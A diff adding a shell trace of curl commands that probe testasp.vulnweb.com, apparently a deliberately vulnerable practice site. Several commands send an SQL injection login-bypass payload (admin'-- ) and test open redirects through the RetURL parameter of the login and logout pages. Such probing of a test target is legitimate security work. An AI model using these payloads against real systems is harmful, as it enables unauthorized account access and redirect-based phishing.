@@ -1,0 +1,12 @@
++ curl -sS --max-time 20 -b cj_s1.txt -c cj_s1.txt -D hdr_o1_default_loggedin.txt -o body_o1_default_loggedin.html http://testasp.vulnweb.com/Default.asp
++ curl -sS --max-time 20 -D hdr_o2_default_anon.txt -o body_o2_default_anon.html http://testasp.vulnweb.com/Default.asp
++ curl -sS --max-time 20 -b cj_s1.txt -c cj_s1.txt -D hdr_o3_showforum_loggedin.txt -o body_o3_showforum_loggedin.html 'http://testasp.vulnweb.com/showforum.asp?id=1'
++ curl -sS --max-time 20 -D hdr_o4_showforum_anon.txt -o body_o4_showforum_anon.html 'http://testasp.vulnweb.com/showforum.asp?id=1'
++ curl -sS -i --max-time 20 -c cj_r0.txt -D hdr_r0_returl_bogus.txt -o body_r0_returl_bogus.html -X POST --data-urlencode tfUName=nosuchuser_zzz --data-urlencode tfUPass=nosuchpass_zzz 'http://testasp.vulnweb.com/Login.asp?RetURL=http://example.com/'
++ curl -sS -i --max-time 20 -c cj_r1.txt -D hdr_r1_sqli_plus_returl.txt -o body_r1_sqli_plus_returl.html -X POST --data-urlencode 'tfUName=admin'\''-- ' --data-urlencode tfUPass=x 'http://testasp.vulnweb.com/Login.asp?RetURL=http://example.com/'
++ curl -sS -i --max-time 20 -c cj_r2.txt -D hdr_r2_protorel.txt -o body_r2.html -X POST --data-urlencode 'tfUName=admin'\''-- ' --data-urlencode tfUPass=x 'http://testasp.vulnweb.com/Login.asp?RetURL=//example.com/'
++ curl -sS -i --max-time 20 -c cj_r3.txt -D hdr_r3_https.txt -o body_r3.html -X POST --data-urlencode 'tfUName=admin'\''-- ' --data-urlencode tfUPass=x 'http://testasp.vulnweb.com/Login.asp?RetURL=https%3A%2F%2Fexample.com%2F'
++ curl -sS -i --max-time 20 -D hdr_r4_get_returl.txt -o body_r4.html 'http://testasp.vulnweb.com/Login.asp?RetURL=http://example.com/'
++ curl -sS -i --max-time 20 -c cj_r5.txt -D hdr_r5_logout_returl.txt -o body_r5.html 'http://testasp.vulnweb.com/Logout.asp?RetURL=http://example.com/'
++ curl -sS -i --max-time 20 -c cj_r6.txt -D hdr_r6_logout_protorel.txt -o body_r6.html 'http://testasp.vulnweb.com/Logout.asp?RetURL=//example.com/'
++ curl -sS --max-time 20 -D hdr_r7_menuencode.txt -o body_r7_menuencode.html 'http://testasp.vulnweb.com/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F'
